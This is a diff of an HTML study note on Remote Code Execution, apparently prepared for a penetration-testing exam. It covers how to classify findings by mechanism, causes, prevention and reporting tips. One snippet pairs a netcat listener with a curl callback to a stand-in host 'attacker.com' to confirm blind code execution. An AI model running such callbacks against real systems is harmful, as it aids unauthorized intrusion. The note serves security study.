@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:56 -->
+<!-- 2026-07-30 Thu 22:14 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Remote Code Execution</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,49 +886,213 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org19daf02">Remote Code Execution</a>
-<ul>
-<li><a href="#org2df3bb7">Causes of RCE</a></li>
-<li><a href="#org00e1ef7">Prevention and Mitigation</a></li>
-</ul>
-</li>
+<li><a href="#orgde5ec81">How RCE Actually Gets Classified</a></li>
+<li><a href="#org5fd0f58">Causes of RCE</a></li>
+<li><a href="#org4be3dae">Confirming RCE (Practical)</a></li>
+<li><a href="#org28578a8">Prevention and Mitigation</a></li>
+<li><a href="#orgb874985">Tips</a></li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org19daf02" class="outline-2">
-<h2 id="org19daf02">Remote Code Execution</h2>
-<div class="outline-text-2" id="text-org19daf02">
 <p>
-Remote Code Execution (RCE) is a type of cyberattack where an attacker can execute arbitrary code on a remote system. This can allow them to gain unauthorized access, steal data, or take control of the system.
+Remote Code Execution (RCE) is the outcome of a vulnerability being
+successfully exploited such that an attacker can execute arbitrary
+code on a target system. RCE is best understood as an <b>impact</b>
+category rather than a standalone technique — it's the end result
+that several different vulnerability classes can lead to, not a
+distinct exploitation method with its own methodology.
+</p>
+
+<p>
+Related: <a href="20260206T060728--sql-injection__cybersecurity_technique.html">SQL Injection</a>
+         <a href="20260624T213806==ssti--server-side-template-injection__cybersecurity_pentesting_technique.html">SSTI</a>
+         <a href="20260624T213851==xxe--xml-external-entity-injection__cybersecurity_pentesting_technique.html">XXE</a>
+         <a href="20260206T060455--command-injection__concept_cybersecurity_technique.html">Command Injection</a>
+         [[Denote query for ‘20260709T192100’]]
+         <a href="20260206T060654--file-inclusion__concept_cybersecurity_technique.html">File Inclusion</a>
+         <a href="20260614T002700--file-upload-vulnerabilities__cybersecurity_pentesting_technique.html">File Upload Vulnerabilities</a>
+         <a href="20260206T060659--incident-response__concept_cybersecurity.html">Incident Response</a>
+</p>
+<div id="outline-container-orgde5ec81" class="outline-2">
+<h2 id="orgde5ec81">How RCE Actually Gets Classified</h2>
+<div class="outline-text-2" id="text-orgde5ec81">
+<p>
+On the exam and in real reporting, "RCE" alone is rarely the
+correct classification — it's the impact, and the finding should
+be classified by the <b>mechanism</b> that achieved it:
+</p>
+
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">Mechanism</th>
+<th scope="col" class="org-left">Classify as</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">Malicious file upload executed by the server</td>
+<td class="org-left">File Upload Vulnerabilities</td>
+</tr>
+
+<tr>
+<td class="org-left">Template syntax evaluated server-side</td>
+<td class="org-left">SSTI</td>
+</tr>
+
+<tr>
+<td class="org-left">OS command injected into a system call</td>
+<td class="org-left">Command Injection</td>
+</tr>
+
+<tr>
+<td class="org-left">Untrusted object graph deserialized</td>
+<td class="org-left">Insecure Deserialization</td>
+</tr>
+
+<tr>
+<td class="org-left">Remote file included and executed (RFI)</td>
+<td class="org-left">File Inclusion</td>
+</tr>
+
+<tr>
+<td class="org-left">XML external entity abused for code execution</td>
+<td class="org-left">XXE</td>
+</tr>
+
+<tr>
+<td class="org-left">Stacked/second-order SQL query enabling execution</td>
+<td class="org-left">SQL Injection, with RCE noted as impact</td>
+</tr>
+</tbody>
+</table>
+
+<p>
+Report the specific mechanism as the classification, and describe
+RCE as the <b>impact</b> of that finding — "Command Injection leading to
+Remote Code Execution," not "Remote Code Execution via a
+vulnerable parameter."
 </p>
 </div>
-<div id="outline-container-org2df3bb7" class="outline-3">
-<h3 id="org2df3bb7">Causes of RCE</h3>
-<div class="outline-text-3" id="text-org2df3bb7">
+</div>
+<div id="outline-container-org5fd0f58" class="outline-2">
+<h2 id="org5fd0f58">Causes of RCE</h2>
+<div class="outline-text-2" id="text-org5fd0f58">
 <ul class="org-ul">
-<li>Vulnerabilities: Software vulnerabilities, such as buffer overflows, <a href="SQL injection.html#sql-injection">SQL Injection</a>, or cross-site scripting (XSS), can be exploited to achieve RCE.</li>
-<li>Misconfigurations: Incorrect configurations of software or systems can create vulnerabilities that can be exploited.</li>
-<li>Weak authentication: Poor password practices or weak authentication mechanisms can allow attackers to gain unauthorized access.</li>
+<li><b>Vulnerabilities:</b> Software vulnerabilities, such as buffer
+overflows, <a href="20260206T060728--sql-injection__cybersecurity_technique.html">SQL Injection</a>, or the
+mechanisms in the table above, can be exploited to achieve RCE</li>
+<li><b>Misconfigurations:</b> Incorrect configurations of software or
+systems can create vulnerabilities that can be exploited — see
+[[Denote query for ‘20260709T193500’]]</li>
+<li><b>Weak authentication:</b> Poor password practices or weak
+authentication mechanisms can allow attackers to gain
+unauthorized access, sometimes escalating to code execution
+(e.g. an admin panel with a code-execution feature reached via
+credential brute force)</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org00e1ef7" class="outline-3">
-<h3 id="org00e1ef7">Prevention and Mitigation</h3>
-<div class="outline-text-3" id="text-org00e1ef7">
-<ul class="org-ul">
-<li>Patch management: Keep software and systems up-to-date with the latest security patches.</li>
-<li>Secure coding practices: Follow secure coding guidelines to prevent vulnerabilities in custom applications.</li>
-<li>Strong <a href="Authentication.html#authentication">Authentication</a>: Implement strong password policies and <a href="Multi-Factor Authentication.html#multi-factor-authentication">Multi-Factor Authentication</a>.</li>
-<li></li>
+<div id="outline-container-org4be3dae" class="outline-2">
+<h2 id="org4be3dae">Confirming RCE (Practical)</h2>
+<div class="outline-text-2" id="text-org4be3dae">
+<p>
+Since RCE is often blind (no direct output returned in the
+response), confirmation typically relies on out-of-band signals
+rather than visible response content:
+</p>
 
-<li>Regular vulnerability assessments: Conduct regular vulnerability assessments to identify and address potential weaknesses.</li>
-<li><a href="Incident Response.html#incident-response">Incident Response</a> planning: Develop a plan for responding to security incidents, including RCE attacks.</li>
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8f98f893a144461f932ee0e1cd70cf41>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_8f98f893a144461f932ee0e1cd70cf41=document.querySelector('button[name=btn_8f98f893a144461f932ee0e1cd70cf41]');
+copyBtnbtn_8f98f893a144461f932ee0e1cd70cf41.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# DNS/HTTP callback — start a listener first\nnc -lvnp 4444\n\n# Payload triggers a connection back, confirming code execution\n# even when the application gives no visible indication of success\ncurl \"http://attacker.com/rce-confirmed\"\n`);copyBtnbtn_8f98f893a144461f932ee0e1cd70cf41.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8f98f893a144461f932ee0e1cd70cf41.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">DNS/HTTP callback &#8212; start a listener first
+</span>nc -lvnp 4444
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Payload triggers a connection back, confirming code execution
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">even when the application gives no visible indication of success
+</span>curl <span style="color: var(--clr-string); background-color: var(--bg-string);">"http://attacker.com/rce-confirmed"</span>
+</pre>
+</div></div>
+
+<p>
+Always prefer out-of-band confirmation (a callback you control)
+over inferring success from response timing or content changes
+alone — it's unambiguous evidence rather than circumstantial.
+</p>
+</div>
+</div>
+<div id="outline-container-org28578a8" class="outline-2">
+<h2 id="org28578a8">Prevention and Mitigation</h2>
+<div class="outline-text-2" id="text-org28578a8">
+<ul class="org-ul">
+<li><b>Patch management:</b> Keep software and systems up-to-date with
+the latest security patches</li>
+<li><b>Secure coding practices:</b> Follow secure coding guidelines to
+prevent vulnerabilities in custom applications — input
+validation, parameterized queries, avoiding dangerous
+deserialization of untrusted input</li>
+<li><b>Strong <a href="20260206T060441--authentication__concept_cybersecurity.html">Authentication</a>:</b> Implement strong password policies and
+<a href="20260212T064723==mfa--multi-factor-authentication__concept_cybersecurity.html">Multi-Factor Authentication</a></li>
+<li><b>Least Privilege:</b> Run application processes with minimal
+permissions, so a successful RCE has limited blast radius rather
+than immediate full system compromise</li>
+<li><b>Regular vulnerability assessments:</b> Conduct regular vulnerability
+assessments to identify and address potential weaknesses</li>
+<li><b><a href="20260206T060659--incident-response__concept_cybersecurity.html">Incident Response</a> planning:</b> Develop
+a plan for responding to security incidents, including RCE
+attacks</li>
 </ul>
 </div>
+</div>
+<div id="outline-container-orgb874985" class="outline-2">
+<h2 id="orgb874985">Tips</h2>
+<div class="outline-text-2" id="text-orgb874985">
+<ul class="org-ul">
+<li>On the exam, never write up a finding as simply "RCE" — always
+name the underlying mechanism from the table above; graders are
+specifically checking for classification precision, and "RCE"
+alone doesn't demonstrate you identified <b>how</b> it was achieved</li>
+<li>If you're unsure which mechanism led to code execution, that's a
+signal to go back and re-examine the exploitation chain rather
+than defaulting to a generic RCE writeup — the specific mechanism
+is usually the more valuable part of the finding for remediation
+purposes anyway</li>
+<li>Blind RCE (no visible output) is common — set up an out-of-band
+listener before attempting exploitation, not after a payload
+appears to fail, same principle covered in the Insecure
+Deserialization note</li>
+</ul>
 </div>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -918,6 +1100,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
